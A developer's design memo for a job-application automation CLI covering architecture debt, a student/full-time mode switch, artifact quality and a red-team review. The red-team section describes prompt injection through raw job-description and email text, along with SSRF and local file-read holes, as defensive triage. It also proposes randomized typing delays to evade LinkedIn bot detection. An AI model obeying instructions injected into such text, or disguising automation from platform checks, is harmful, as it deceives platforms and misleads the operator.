# Design Notes & Open Questions

Rolling memo for design completeness review. Not a migration plan — captures
what is good as-is, what needs improvement, and known mismatches between the
system and the operator's actual situation.

Last updated: 2026-07-06.

## Section A — Architecture & Modularity Audit

### A.1 `cli.py` size

- **Status**: ~6580 lines, down from ~7010 after the 2026-05-11 extraction
  pass.
- **Extracted to `services/workday/`** in that pass:
  - `login.py` — `_maybe_workday_login` + diagnostic dump (~300 lines).
  - `voluntary_disclosures.py` — `_fill_workday_voluntary_disclosures`
    (~70 lines).
  - `my_information.py` — the small `required_blocks_my_information_continue`
    heuristic (other My Information logic stays inline; the helpers it
    needs all live in cli.py).
  - `my_experience.py` — `write_debug_field_dump` and
    `experience_dates_match` (the self-contained pieces).
- **Still inline in cli.py**:
  - `_workday_advance_all_steps` orchestrator and the bulk of the My
    Experience fill cluster (`_fill_workday_my_experience`,
    `_fill_workday_structured_experience`,
    `_fill_workday_experience_card_by_order`,
    `_fill_workday_experience_dates_by_title`,
    `_fill_workday_structured_education`,
    `_fill_workday_education_card_by_order`,
    `_workday_fill_repeating_section`, ...).
  - These all rely on shared Workday helpers
    (`_select_workday_dropdown_*`, `_fill_workday_field_containing`,
    `_ensure_workday_section_item`, ...) that ALSO live in cli.py.
    Extracting the fillers without first moving those shared helpers
    would just push the boundary one level deeper.
- **Verdict**: extraction pass landed the cleanly-separable pieces.
  Next pass should move the shared Workday helpers as a group, then the
  fillers, then `_workday_advance_all_steps`. Triggered when the next
  Workday flow change touches this region.
- **Related debt**: backward-compat shims (`workday_employer.py` re-exports,
  `cli.py` aliases like `_workday_review_validation_issues`,
  `_fill_workday_voluntary_disclosures`,
  `_workday_experience_dates_match`, ...). These are still actively called
  from `cli.py`, so they are live aliases, not dead code; removing them is a
  rename-all-call-sites task, deferred until the next Workday region refactor
  (A.1 verdict).
  - **Sunset rule (set 2026-06-13)**: a compat shim earns removal once it has
    no remaining caller OR the process/state it bridged can no longer exist.
    First application: the apply-IPC named-sentinel compat path
    (`submit_command_with_compat` + `.replace_pdf`/`.capture_page` reads) was
    removed — see ADR-012. It had both: the v2 UUID sentinel superseded it AND
    the ≤60-min session lifetime meant no pre-upgrade caller survived; leaving
    it in had started double-processing every command.

### A.2 ATS coverage asymmetry

- **Status**: Workday has yaml-driven question fill + structured Review gate
  + multi-gate auto-submit. Greenhouse / Lever / Ashby are scanned for
  discovery only and stay manual on the apply side.
- **Verdict**: tradeoff, accept. Workday is the worst ATS surface and gets
  the heaviest investment, correctly. The "Workday-first apply assistant;
  other ATSes are generic fill + manual submit" note was added to the Apply
  Assistant section of `docs/design.md` (2026-06-13) so readers do not assume
  parity.
- **Defer**: a generic `ReviewGate` protocol. Wait until at least three
  ATSes need one before generalizing.

### A.3 ATS detection strategy

- **Status**: `detect.url_contains` substring matching only. No regex,
  no logo, no page-title heuristic.
- **Verdict**: maintain. Workday hosts (`*.myworkdayjobs.com`) are stable
  enough that anything more is over-engineering.

## Section B — State, Persistence, Recoverability

### B.1 Graph checkpoint

- **Status**: `MemorySaver` for the evaluation graph. Crash mid-evaluate
  loses progress.
- **Verdict**: maintain. Evaluation is sequential, ≤1 minute, idempotent;
  re-running is cheap.

### B.2 Apply session liveness

- **Status**: 5s heartbeat + 60-min idle timeout + per-command UUID sentinels
  + JSONL run log.
- **Verdict**: complete; do not change.

### B.3 Local evaluation history

- **Status**: LangSmith trace exists; no local equivalent of
  `apply-run.jsonl` for evaluation.
- **Verdict**: low value unless prompt iteration becomes heavy. Defer.

## Section C — Data Storage Formats

### C.1 Mixed format inventory

`applications.md` (markdown table) + `pipeline.md` (markdown checklist) +
`scan-history.tsv` + `contacts.jsonl` + `outreach-events.jsonl` +
`activity-log.jsonl`.

- **Verdict**: maintain. Each format suits its access pattern. Tracker is
  human-edited (markdown). Event streams are append-only (jsonl). Scan
  history is tabular (tsv). Unifying is over-engineering.

### C.2 Schema versioning gap

- **Status**: `apply-review.json` now carries `schema_version: 1`
  (2026-05-11). Constant lives in `cli.py::APPLY_REVIEW_SCHEMA_VERSION`.
- **Rule**: bump on rename / remove / semantic change. Additive fields do
  NOT require a bump.
- **Verdict**: complete.

### C.3 Tracker integrity

- **Status**: filelock + fuzzy match (token_sort_ratio ≥ 0.85) +
  `tracker verify` for status / score / fuzzy-dup checks.
- **9-column hard check**: shipped 2026-05-11.
  `tracker_ops._check_tracker_row_columns` runs against every data row in
  `applications.md` and emits an error when the pipe-separated cell count
  isn't exactly 9. Hand edits that drop or add a `|` get caught at
  verify rather than corrupting a later merge.
- **Verdict**: complete.

## Section D — External APIs (WebSearch / LLM)

### D.1 Brave WebSearch governance

- **Status**: provider abstraction shipped; graceful degrade when key
  absent. 24h on-disk cache + monthly quota counter shipped 2026-05-11.
- **Cache layout**: `cache/web_search/brave/entries/<sha256>.json`
  (one file per `(query, count, freshness)` triple). TTL configurable
  via `web_search.cache_ttl_seconds` (default 86400). Disable per-env
  via `web_search.cache_enabled: false`.
- **Counter layout**: `cache/web_search/brave/usage.json`, keyed by UTC
  `YYYY-MM`, with `api_calls` / `cache_hits` / `errors` fields. Inspect
  via `job-hunt search-usage [--month YYYY-MM]`.
- **Wiring**: `build_web_search_provider()` wraps the raw provider in
  `CachingProvider` by default. The wrapper records counters and skips
  caching empty results so a transient outage isn't pinned for 24h.
- **Verdict**: complete. Revisit only on quota / outage incident.

### D.2 LLM providers

- **Status**: single provider (`minimax`) plus traced wrapper. Factory
  exists but no documented multi-provider fallback.
- **Verdict**: maintain. Personal tooling does not need multi-provider
  failover. Confirm `factory.py` still allows pointing at a local model
  for offline dev; if yes, do not touch.

## Section E — Auto-Submit Gating

- **Status**: 4 simultaneous gates — CLI flag + `profile.yml` flag +
  Workday host check + (validation_issues == [] AND required_empty == []).
- **Verdict**: complete; do not change. Safety > flexibility is correct
  here.

## Section F — Evaluation Flow Cost Control

- **Status**: post-score early-exit fully wired in the runtime graph
  (2026-05-11).
- **What runs unconditionally** (pre-score, can't gate on a score that
  doesn't exist yet): `extract_jd`, `verify_active`, `eligibility_gate`,
  `classify_archetype`, `cv_match`, `role_summary`, `level_strategy`,
  `company_comp_research`, `personalization_plan`, `interview_prep`,
  `score_and_recommend`. The two cheap pre-score gates (`verify_active`
  → END for dead URLs, `eligibility_gate` → END for mode mismatch)
  cover the highest-saving early-skip cases.
- **What's gated on the score after `score_and_recommend`**:
  - `draft_application_answers` — no-op if `weighted_total < 4.5`.
  - `_route_pdf` — `skip_pdf` when `scores.generate_pdf == False`.
  - `generate_cover_letter` — short-circuits when
    `scores.generate_pdf == False` (added 2026-05-11). Saves the
    cover-letter LLM call + Playwright PDF render on SKIP-bound JDs.
- **Apply-side gate**: `_enforce_low_score_gate` blocks `job-hunt apply`
  on tracker rows below 4.0/5 unless `--low-score-override` is passed.
- **Verdict**: complete. The remaining unconditional spend is the
  pre-score analysis, which is necessary to compute the score in the
  first place. No further gating without a heuristic, which would be
  brittle (see ADR conversations).

## Section G — Email Reconcile Edge Cases

- **Status**: confidence threshold + review queue +
  `--skip-review --apply` path. Designed conservatively.
- **Edge case to verify**: user manually marks Rejected, then employer
  rejection email arrives. Likely no-op (already Rejected) but worth a
  dry-run to confirm the reconcile path does not regress status.
- **Verdict**: maintain; spot-check.

## Section H — Observability & Funnel Metrics

- **Status**: `apply-run.jsonl` (per session) + `activity-log.jsonl`
  (global) + `dashboard_html.py`.
- **Gap**: no funnel metrics — applied → response rate, response by
  archetype, mean time-to-response.
- **Verdict**: high-value once data exists. Wait until ≥30 Applied rows
  before designing dashboards on top.

## Section I — ADR Trail

- **Status**: ADR-009 through ADR-012 captured as one-page files under
  `docs/adr/` (2026-05-11). Index in `docs/adr/README.md`.
- **Verdict**: complete. Future ADRs land in the same directory; older
  decisions (ADR-001..008) stay implicit in `docs/design.md` unless a
  future incident makes one worth promoting.

## Section J — Honeypot Handling

- **Status**: Workday `Website` honeypot is hardcoded in `cli.py`.
- **Risk**: Greenhouse and Ashby also embed honeypots. Will need
  duplication.
- **Verdict**: extract into yaml only when the second site forces it,
  not preemptively.

## Section K — CLI Surface

- **Status**: 50+ commands across 11 sub-apps. `job-hunt loop` covers ~80%
  of usage as the minimal entry.
- **Verdict**: maintain. Typer help suffices for discoverability.

## Section L — Top 3 Cheap Wins (closed 2026-05-11)

All three landed in a single batch:

1. **`schema_version` in `apply-review.json`** — Section C.2 closed.
2. **9-column hard check in `tracker verify`** — Section C.3 closed.
3. **Low-score early-exit confirmed and extended** — Section F closed.
   Confirmed PDF + draft-answers gates were already wired; added a
   cover-letter gate on `scores.generate_pdf` so the flag-on/SKIP case
   stops wasting the cover-letter LLM call and Playwright render.

## Section M — Explicitly Out Of Scope

Do not pursue these without a concrete trigger:

- A generic ATS `ReviewGate` abstraction.
- Storage-format unification.
- Multi-LLM-provider failover.
- Auto-submit on Greenhouse / Ashby / Lever.

---

# Operator-Reported Pain Points (2026-05-10)

The two issues below are not architecture-level. They reflect a mismatch
between how the system models the operator's situation and the operator's
actual eligibility window. Both surface as everyday friction.

## Pain Point 1 — Job discovery coverage is too narrow

### Observed

`job-hunt scan` directly fetches Greenhouse, Lever, and Ashby APIs.
Companies marked `scan_method: websearch` go through Brave when configured.
Everything else is invisible to discovery.

### Missing platforms (relevant to the operator's market)

**General Canadian market:**
- LinkedIn Jobs — the largest single source for AI/data roles in Canada.
  No public API; needs WebSearch or scraping.
- Indeed Canada — same gap.
- Glassdoor — same.
- Job Bank Canada (`jobbank.gc.ca`) — public-sector and entry-level roles.
- Built In Toronto, TechToronto — Canadian tech-focused aggregators.

**Other ATS hosts in active use:**
- Workday (`*.myworkdayjobs.com`) — listed per-employer for apply, but no
  cross-employer discovery scan.
- iCIMS, BambooHR, SmartRecruiters, Taleo / SuccessFactors, Workable,
  JazzHR, Recruitee — common at mid-market employers; not covered.

**Startup-heavy sources for AI / LLM roles:**
- Y Combinator's Work at a Startup (`workatastartup.com`).
- Wellfound (formerly AngelList Talent).

**Student / intern / co-op specific (critical for current operator
status — see Pain Point 2):**
- TalentEgg — Canadian internships.
- Magnet — government-backed Canadian talent network.
- WaterlooWorks — co-op gold standard, gated to Waterloo enrolment but
  many postings cross-list.
- University-internal portal (Mohawk College, University of Niagara
  Falls Canada) — required by some employers and only visible there.
- FSWEP (Federal Student Work Experience Program) and OPSIP (Ontario
  Public Service Internship) — government student programs.
- Riipen, Outco — project-based co-op alternatives.
- Formal new-grad / intern programs (Shopify Dev Degree, RBC Amplify,
  BMO Capital Markets, TD Tech Internship, etc.) — often gated to
  internal portals.

### Verdict

Improvement, high priority. The current scan misses the platforms most
likely to hold roles the operator can actually take. Approach:

1. **Done (2026-05-11)**: LinkedIn / Indeed / Glassdoor / YC Work-at-a-
   Startup / Wellfound landed as **tier-3 cross-employer discovery
   channels**. Implementation in
   ``services.scan.scan_discovery_channels``; schema documented in
   ``config/portals.example.yml`` under ``discovery_channels:``. Each
   channel is opt-in (``enabled: false`` default), gated by ``modes:
   [full]`` / ``[student]``, and expands its ``query_template`` over
   ``profile.candidate.target_roles`` × ``target_locations``. Results go
   through the same title / location / dedup pipeline as tier-1 and
   tier-2.
2. **Done (2026-05-11)**: Student channels — WaterlooWorks, TalentEgg,
   Magnet, Job Bank Canada — added in the same batch with
   ``modes: [student]`` and student-flavoured templates. ``mode``
   switching (Pain Point 2 / Section N) decides which set activates
   without a per-command flag.
3. **Deferred**: ATS-specific adapters (iCIMS, BambooHR,
   SmartRecruiters, Taleo, Workable, JazzHR, Recruitee). Add in priority
   order driven by *which postings get bookmarked manually*. Don't
   pre-build adapters for ATSes the operator never sees.

## Pain Point 2 — Scoring mechanism does not match the operator's status

### Observed mismatch

`profile/profile.yml` accurately states:

- `visa_status`: international student, 20 hrs/week off-campus, graduating
  July 2026, full-time eligibility post-PGWP (Aug 2026+).
- `target_roles.archetypes`: every entry levels at "Senior" or
  "Mid-Senior".
- `narrative.headline`: "20-year tech veteran".

`prompts/evaluate/score_and_recommend.md` weights:

- Technical fit 30%
- Level fit 20%
- Domain fit 15%
- Growth trajectory 15%
- Company fit 20%

Threshold: weighted_total ≥ 4.0 → apply.

### Why this is wrong for the operator's current situation

The current scoring system, calibrated for "20-year veteran applying for
senior roles", systematically inverts recommendations for the role
categories the operator is currently targeting:

- A senior FT role gets a high "Level fit" score because the CV maps
  well to senior. Scores APPLY. False positive when the operator is
  hunting co-ops.
- An intern / co-op posting gets a low "Level fit" score because a
  20-year veteran is "overqualified". Scores SKIP. False negative on
  exactly the role category being hunted.

The scorer needs to know which kind of hunt is in progress.

### Design changes needed (no code in this memo, design only)

The system is intentionally kept ignorant of *why* the operator is in
one mode or the other (study permit, graduation date, PGWP, leaves of
absence, deferred enrolment, etc. are all out of scope). It only needs
to know the current mode. See **Section N** below for the top-level
switch that drives every change in this list.

1. **Single top-level mode switch in `profile.yml`** — see Section N.

2. **Add an eligibility gate before the scorer.** Binary, driven by the
   mode switch only:
   - mode = student: intern / co-op JD ⇒ pass to scorer; FT JD ⇒ force
     SKIP.
   - mode = full: FT JD ⇒ pass to scorer; intern / co-op JD ⇒ force
     SKIP.

   No date math. No "future eligibility" bucket. The gate runs after
   JD extraction and before `score_and_recommend`, parallel to the
   existing location filter.

3. **Split scoring into two profiles**, selected by the same mode
   switch:
   - `score.student`: weights tilted toward Domain fit, Growth, and
     Company fit; Level fit reframed as "is this a meaningful learning
     step / signal-builder?".
   - `score.full`: today's weights.

4. **Fix `target_roles.archetypes`** to carry an explicit
   `eligibility:` tag and include both tracks:
   - Intern / co-op archetypes tagged `eligibility: student`
     ("AI Engineer Intern / Co-op", "Data Analyst Co-op",
     "Software Engineer Intern").
   - Existing senior archetypes tagged `eligibility: full`.

   The active subset is selected by the mode switch.

5. **Tune title filters** in `config/portals.yml`. Split into two named
   sets — one with intern / co-op / internship / co-operative as
   positives, one with them as negatives. Loader picks based on mode.

6. **Cover-letter / resume framing.** Add a second narrative variant in
   `profile.yml` keyed by mode. The "20-year veteran" self-positioning
   is correct under mode = full but confuses recruiters reviewing
   intern / co-op applications.

### Verdict

This is the highest-leverage design issue currently open. Fixing
discovery (Pain Point 1) without fixing scoring just produces more
mis-scored noise. Recommended order: scoring profile + eligibility gate
first, then expand discovery into student / co-op channels.

## Section N — Top-Level Mode Switch (added 2026-05-10)

The fixes proposed for Pain Point 2 (eligibility gate, dual scoring
profiles, archetype split, narrative variants) all branch on the same
underlying state: "is the operator currently a student, or do they have
full work authorization?" Rather than each subsystem deriving this
independently, the system has **one top-level switch** that all
downstream behaviour reads from.

### N.1 Design principle: single config, no external state awareness

The system **deliberately does not model the cause** of the current
mode. It does not know about study permits, graduation dates, PGWP
processing, hours-per-week limits, leaves of absence, or any other
real-world legal / academic state. It does not track when the mode was
last changed or when it should change next. It only reads one field and
branches on its value.

This is a hard scoping decision, not a simplification to revisit later.
External state (immigration, school enrolment, family circumstances) is
the operator's domain. The system's job is to behave correctly *given*
the mode the operator has set.

### N.2 Switch shape

Add to `profile.yml` at the top level, exactly two values:

```yaml
mode: "student"   # student | full
```

No history. No dates. No reasons. No nested structure. Flipping is a
plain edit to this one field (or via `job-hunt config set-mode <value>`
for safety).

### N.3 Cascade: what each subsystem reads from `mode`

The switch is the single source of truth. Every behaviour below is
selected by `mode`, with no other independent flag controlling the same
axis.

| Subsystem | mode = student | mode = full |
|---|---|---|
| **Scan: tracked_companies filter** | `eligibility_tags` ⊇ {`intern`, `coop`} required | senior/mid postings only |
| **Scan: extra channels** | WaterlooWorks, TalentEgg, Magnet, FSWEP / OPSIP, university-internal portal, formal new-grad / intern programs (Shopify Dev Degree, RBC Amplify, TD, BMO) | LinkedIn / Indeed / Glassdoor / YC / Wellfound; student channels disabled |
| **Title filter (`portals.yml`)** | positive: includes `intern`, `co-op`, `internship`, `co-operative`, `student`, `new grad` | negative: includes `intern`, `co-op` (so they don't pollute FT search) |
| **JD eligibility gate** | intern / co-op JD ⇒ pass to scorer; FT JD ⇒ force SKIP | FT JD ⇒ pass to scorer; intern / co-op JD ⇒ force SKIP |
| **Scoring weights** | `score.student` profile (Level fit downweighted to 10%, Domain & Growth boosted) | `score.full` profile (current weights) |
| **Active archetypes** | only entries tagged `eligibility: student` | only entries tagged `eligibility: full` |
| **Narrative variant** | `narrative.student` (positions as "experienced contributor returning to study, seeking applied learning") | `narrative.full` (current "20-year veteran") |
| **Cover-letter framing** | reads `narrative.student`; emphasises learning velocity + co-op fit | reads `narrative.full`; emphasises seniority + impact |
| **CV PDF `summary_angle`** | branched the same way | branched the same way |
| **Recommendation thresholds** | apply ≥ 3.5; maybe 3.0–3.5; skip < 3.0 (lower bar — co-ops have less tail risk) | apply ≥ 4.0; maybe 3.5–4.0; skip < 3.5 (current) |
| **Auto-submit** | disabled regardless of `apply.auto_submit_enabled` (co-op forms are higher-variance and student paperwork shouldn't auto-fire) | follows existing gates |
| **Compensation expectations in prompts** | reads `compensation.student_range` (likely a stipend / hourly band) | reads `compensation.full_range` (current `target_range`) |
| **Outreach script tone** | LinkedIn outreach prompts emphasise co-op timing + university affiliation | current prompts |

### N.4 Implementation surface (design only)

The switch should land via these touch points, in this order:

1. **`profile.yml` schema** — add the top-level `mode` field, the
   per-archetype `eligibility:` tag, `narrative.student` /
   `narrative.full` blocks, and `compensation.student_range` /
   `compensation.full_range`.
2. **`profile_loader.py`** — expose `current_mode()` helper. Every other
   subsystem reads through it; nobody parses `profile.yml` for mode
   directly.
3. **`scan.py`** — branch tracked-companies filtering, extra channels,
   and title-filter selection on `current_mode()`.
4. **`portals.yml`** — split `title_filter` into `title_filter.student`
   and `title_filter.full`; loader picks one based on mode.
5. **Evaluate graph** — insert eligibility-gate node after `extract` and
   before `score_and_recommend`; gate reads mode + JD signals; binary
   pass / SKIP.
6. **`score_and_recommend.md`** — render the prompt with the mode-
   selected weight table and threshold; both versions live in the
   prompt file, jinja `{% if mode == "student" %}` switches.
7. **`cover_letter.md`, `cv.html.j2`, narrative-consuming prompts** —
   render the mode-selected narrative block.
8. **`config doctor`** — surface the current mode value, no date logic.
9. **CLI `config set-mode <student|full>`** — writes the field
   atomically; refuses if already in the requested mode without
   `--force`. Prints which subsystems will change next time they run.
10. **Tests** — fixture `profile.yml` variants for each mode; assert
    that the same JD produces opposite recommendations under the two
    modes (this is the regression test that proves the switch is wired
    end-to-end).

### N.5 No per-command override

Earlier drafts considered an `evaluate --mode full` / `scan --mode full`
override for the case "a recruiter posted FT but says they'd hold the
role until graduation". This override is **not** implemented.

Reason: HR pipelines do not work that way. No employer recruits with a
plan to "first hire as a student, then convert later". When a company
sees value in a student, the path is "hire as a student now, evaluate
for conversion internally" — which is already covered cleanly by mode =
student. The override solves a case that does not exist in practice.

The system has exactly one mode at a time, set in `profile.yml`.
Discovery, evaluation, and apply all read the same value. No flags
override it.

Slack / activity-log events should carry the mode tag — zero risk, and
makes later funnel analysis (Section H) able to slice by mode.

### N.6 Verdict

This switch is a precondition for fixing Pain Point 2. Without it, the
fixes proposed in Pain Point 2 either (a) double-implement the same
mode check across every subsystem, or (b) drift out of sync the moment
one subsystem updates its derivation logic and others don't. The
"system stays ignorant of cause, only reads one field" principle
(Section N.1) is what keeps the design small enough to be correct.

---

# Section O — Artifact Quality Review (2026-06)

A second optimization track ran in June 2026, separate from the May
architecture audit (Sections A–N). It came from reading the *actual
generated artifacts* — the CV PDF, the cover-letter PDF, and the report —
as the recruiter and the ATS/AI screener who consume them, and fixing what
read wrong. These changes were shipped but not recorded here until now;
this section closes that tracking gap. Full rationale for the largest piece
(the quality-audit loop + reasoning-model budget) is **ADR-013**.

## O.1 Reader-perspective fixes (round 1, commit `19329d0`)

- `tailor_cv` no longer emits its own Professional Summary section — the CV
  template's target banner already renders the tailored `summary_angle`, so
  the PDF was opening with two near-identical positioning paragraphs.
- The embedded letter section in `cv.pdf` is titled "Cover Letter", not
  "Cover Letter Draft" — the PDF may be submitted as-is, and a recruiter
  reading "Draft" sees an unfinished document.
- `interview_prep` was asked to use company research for interviewer
  questions but never received it; it now gets the `comp_research` and
  `cv_match` blocks (prompt v3).

## O.2 Quality-audit loop + MiniMax-M3 reasoning support (round 2, commit `6379381`)

Largest change of the track; see **ADR-013** for the full record. Summary:

- **Generate → audit → regenerate loop** (`nodes/_quality.py` +
  `prompts/evaluate/quality_audit.md`): every tailored CV and cover letter is
  reviewed by a second LLM pass against the hard framing rules; failing
  drafts are regenerated with the auditor's feedback, up to 3 attempts. A
  deterministic tenure self-label regex gates before the LLM audit. Final
  failure keeps the last draft and warns rather than blocking.
- **MiniMax-M3 (reasoning model) support**: hidden reasoning consumes the
  completion budget before visible content. Provider adds reasoning headroom,
  retries once on `finish_reason=length`, and raises loudly if still
  truncated instead of degrading silently (score parse fail → 0.0 skip, or
  untailored-fallback CV). Cheap-tier timeout raised to 420s.
- **JD metadata extraction fix**: `_guess_title_company_location` only scanned
  the first line, so markdown JDs with a `**Company:** X` block got empty
  company/title — which also let senior JDs slip past the student-mode
  eligibility gate as "unknown". It now scans the top 15 lines with emphasis
  stripped and parses `# Title — Company` headings.

## O.3 Round-3 cleanup + article-digest wiring (commit `39c31ab`)

Found by reviewing the live-run PDF:

- Fallback (untailored) CV render stacked the master CV's generic summary
  under the JD-specific banner angle — that path now strips the Professional
  Summary section when a `summary_angle` exists.
- Cover-letter PDF showed literal backticks/asterisks because the template
  renders paragraphs as plain text — `_split_paragraphs` now strips inline
  markdown markers.
- `top_bullets` had no length bound and came out paragraph-sized — capped at
  40 words each in the `pdf_content` quality rules.
- The report never included the generated letter body; added a "Cover Letter
  (as generated)" section so the operator can review without opening the PDF.
- **Latent bug**: `context.py` loaded `profile/article-digest.md` into state
  but no prompt ever received it, despite `shared.md` declaring it the
  precedence source for metrics. All six fact-grounding prompts (`cv_match`,
  `tailor_cv`, `cover_letter`, `personalization`, `score_and_recommend`,
  `quality_audit`) now take an optional Article Digest block.

## O.4 Reasoning headroom raise (commit `a0fbce3`)

Live CV-rewrite starvation showed the initial `+4000` M3 headroom was still
too tight; raised to `+8000`. Folded into ADR-013.

## O.5 Verdict

Track complete and now documented. The operator mandate — **trade tokens for
quality** — is the throughline: prefer extra LLM passes / retries / headroom
over cheaper-but-worse output. Apply the same bias to future generation work.

---

# Section P — Global Expansion Design (added 2026-07-06, not scheduled)

Design memo only. The operator stays focused on the Canadian market for now;
this section captures the design and the effort estimate so the go/no-go
decision can be made later without re-deriving the analysis. Mirrors the
Section N method: one top-level config block, every subsystem reads through
it, the system stays ignorant of *why*.

## P.1 What "global" actually means for this operator

Three geo classes, not a country-by-country visa model:

1. **remote_global** — employer hires people based in Canada (direct, EOR,
   or contractor). No new work authorization needed; timezone is the main
   constraint.
2. **relocation** — role is in a target country and the employer sponsors
   visas. Viable only for a shortlist of countries/employers.
3. **blocked** — requires local work authorization, no sponsorship. SKIP
   before spending evaluation tokens.

## P.2 Current Canada hardcoding inventory

| Layer | Location | Issue |
|---|---|---|
| Scan | `scan.py::_location_matches_canada` + `--include-non-canada` | hardcoded allow/block city tokens; default drops all non-Canada |
| Scan | `discovery_context` fallback `["Canada"]`; portals.yml query strings | Canada baked into queries (`ca.indeed.com`, "Halifax", "Canada") |
| Evaluate | `eligibility_gate` | student/full only; no geo / sponsorship dimension |
| Apply ⚠️ | `profile/workday-employers/_default.yml` | "legally permitted to work in the country where this job is located" answered as if the job is always in Canada — **wrong answer auto-filled on any non-Canada application; honesty blocker, must land before any discovery expansion** |
| Apply | `cli.py` phone code "Canada (+1)"; `easy_apply.py` country default "Canada" | should read `profile.location`, not literals |
| PDF | `nodes/pdf.py` | already geo-aware (letter vs A4 by JD country) — no change |

## P.3 Config shape: `geo:` block in profile.yml

```yaml
geo:
  work_authorized: ["Canada"]          # single source of truth
  remote:
    accept: true
    hire_in_authorized_country_ok: true
    timezone_home: "America/Toronto"
    max_overlap_gap_hours: 6           # scorer context, not a hard gate
  relocation:
    accept: true
    requires_sponsorship: true
    target_countries: ["United States", "United Kingdom", "Singapore", "UAE"]
```

## P.4 Cascade (Section N.3 style)

| Subsystem | Change |
|---|---|
| Scan filter | replace `_location_matches_canada` with `services/geo.py::classify_location() -> authorized \| remote_global \| relocation \| blocked`; token tables generated from the `geo:` block; `--include-non-canada` → `--geo authorized\|remote\|relocation\|all` |
| Discovery channels | `region:` tag per channel; regional query domains (indeed.com / uk.indeed.com / ca.indeed.com); add remote-global boards (RemoteOK, WeWorkRemotely, Remotive, Wellfound remote, HN Who's Hiring) and relocation boards (relocate.me etc.); all global channels `modes: [full]` |
| eligibility_gate v2 | `extract_jd` additionally emits `job_country` + `sponsorship_signal` (regex tier: "authorized to work in the US", "no visa sponsorship", "remote anywhere", "EOR"); gate adds `geo_blocked` SKIP reason alongside the student/full check |
| Scoring | no new weight dimension — inject one geo-context line into the score prompt (timezone gap / sponsorship needed); Company fit absorbs it |
| Compensation | `compensation.currency` + comp-research prompt reports local currency with CAD conversion |
| Apply: work-auth answers ⚠️ | `_default.yml` work-authorization ops branch on `job_country` via existing `choices_by`: Canada → Yes; elsewhere → truthful No / needs sponsorship |
| Apply: defaults | Workday phone country code + LinkedIn country read from `profile.location` |
| Auto-submit | 5th gate: geo class `relocation` (work-auth answer ≠ Yes) ⇒ never auto-submit |
| CV / letter | no per-country narrative split; cover-letter prompt rule: remote_global ⇒ state "based in Canada, authorized to work in Canada"; relocation ⇒ state sponsorship need honestly |
| Funnel | `geo_class` tag on activity-log events so Section H metrics can slice by geo |

## P.5 Phases + effort estimate

Estimates assume current codebase familiarity; test counts follow existing
per-module conventions.

| Phase | Scope | Estimate |
|---|---|---|
| **G1 — correctness first** | `geo:` schema + `services/geo.py` classifier + replace `_location_matches_canada` + `_default.yml` work-auth branching + auto-submit 5th gate + tests | **1.5–2 days**. Blocker for everything else: expanding discovery without G1 mass-produces applications with wrong work-auth answers |
| **G2 — discovery** | region-tagged channels, regional query templates, remote-global + relocation boards in portals.yml + tests | **0.5–1 day** (mostly config + template expansion) |
| **G3 — evaluation** | `extract_jd` geo fields + eligibility_gate geo dimension + score-prompt context line + compensation currency | **1–1.5 days** (prompt + node + gate tests) |
| **G4 — metrics** | `geo_class` in activity log + funnel slice | **0.5 day**, rides on the Section H dashboard work |
| **Total** | | **3.5–5 days** of focused work |

## P.6 Timing and verdict

Not scheduled. Two natural triggers, both expected around 2026-08:

1. The `mode: student → full` flip (PGWP) — global channels are
   `modes: [full]` anyway, so G2+ has zero effect until then.
2. Section H funnel data (33 Applied rows, threshold met) showing the
   Canadian response rate justifies (or doesn't) widening the top of the
   funnel.

If pursued, land G1 alone first — it is also a latent-correctness fix for
the *Canadian* flow (any Workday employer whose posting sits outside
Canada today gets the same wrong work-auth answer).

---

# Section R — Red-Team Review (2026-07-06)

Dual red-team pass over the whole repo. `agy` ran a full read-only audit;
`codex` was requested as the cross-host partner but its ChatGPT quota was
exhausted (degraded), so cross-validation is host (Claude) + agy only — one
external, not two. Findings below are triaged by *this system's actual threat
model*: a single-operator local CLI, apply defaults to fill-only with manual
submit, auto-submit is off by default and Workday-only behind four gates.

## R.1 Fixed in this pass

- **[was P0] Workday embedded-fallback blind-fill** — `_FALLBACK_CONFIG` in
  `employer_config.py` carried student answers ("Yes, student at Example
  University, Master of Data Analytics, Graduate Year 2") reachable by
  `by_index` (positional) strategies. On a Workday page with neither a
  matching employer yaml nor `_default.yml`, `by_index` would fill those into
  whatever dropdown sat at that position. Fix: `_sanitize_embedded_fallback`
  strips all `by_index` strategies from the embedded fallback (employer yamls
  keep theirs — they pin a known question order); ops left with no strategy
  are dropped so the field is surfaced for manual fill instead of guessed.
  Severity in practice was below agy's P0: the operator has `_default.yml`, so
  the embedded fallback rarely triggers, and auto-submit is off by default.
  But it becomes a real hazard once `mode` flips to full with the student
  Workday configs still present — hence fixed now.

## R.2 Confirmed, deferred (with rationale)

- **[P1] No instruction/data separation in prompts** — every prompt is one
  `user` message (`_llm.py`); JD text, scraped pages, and email bodies are
  interpolated raw, so a malicious JD/email can try to steer scoring or
  generated text. Real. Mitigation is a system/user split with delimited
  untrusted blocks. Deferred: blast radius is a mis-scored row the operator
  still reviews before applying; no auto-action keys off the score. Worth
  doing before any unattended/batch evaluate mode.
- **[P1, corrected] "Email body manipulates tracker"** — agy tied this to the
  new LLM `summarize.py`. Corrected: `reconcile.py` does not read the LLM
  summaries at all — it uses the rule parser `classify_email_event`, and an
  auto status change needs `--apply` + `update_existing` + a reliable fuzzy
  match; high-value states otherwise land in the review queue. `summarize.py`
  output (`email-summaries.jsonl`) currently drives no automatic action. Real
  residual: a crafted rejection/offer email that the rule parser matches could
  flip a row on a manual `reconcile --apply`. Deferred; consider sender-domain
  verification before auto-updating to Offer/Interview.
- **[P2] `write_tracker_addition` read-modify-write race** — `nodes/tracker.py`
  computes `next_num` outside the filelock held by `append_entry`; two
  concurrent processes could duplicate a row number. Real but low-frequency
  (evaluate is sequential within a run; needs two `job-hunt` processes at
  once). Fix = hold the lock across parse→append.
- **[P2] Fuzzy company match wrong-row** — normalized `fuzz.ratio` can score
  "Goog" vs "Google" ~0.87 and, with an exact role, update the wrong row on
  reconcile. Real; tighten the company gate to exact-normalized or route
  partials to review.
- **[P2] SSRF / `local:` file read** in `web_extract.py` — no private-IP block
  on fetched URLs; `local:<path>` reads arbitrary files. Real but weak threat
  model: URLs are operator-supplied or from job boards (http(s)), the tool
  runs locally on macOS with no cloud metadata endpoint, and `local:` reads
  the operator's own files. Fix if a batch/hosted mode ever ingests untrusted
  URLs: block private ranges, sandbox `local:` to `jds/`.
- **[P2] LinkedIn account-ban exposure** — instant `element.fill()` with no
  human-like delays is easily bot-flagged; relevant because a banned LinkedIn
  account hurts the operator's core Canada goal. Mitigation: randomized
  per-key typing delays. (No auto-login already reduces exposure.)
